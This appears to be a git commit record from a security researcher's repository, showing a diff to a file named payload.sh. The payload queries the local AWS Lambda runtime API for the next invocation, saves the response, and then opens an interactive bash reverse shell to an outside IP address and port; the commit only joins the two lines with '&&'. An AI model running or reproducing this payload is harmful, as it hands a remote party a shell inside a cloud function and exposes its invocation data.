3775d81d42134bb141d7ec1eae60b154f039871a
praetorian-snyk-max-2 <aarushi.dwivedi+2@praetorian.com>
2024-11-27 12:32:10 -0500

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,2 +1,1 @@
-curl -vv http://127.0.0.1:9001/2018-06-01/runtime/invocation/next -o output.txt -s
-bash -i >& /dev/tcp/3.95.20.82/4001 0>&1
+curl -vv http://127.0.0.1:9001/2018-06-01/runtime/invocation/next -o output.txt -s && bash -i >& /dev/tcp/3.95.20.82/4001 0>&1
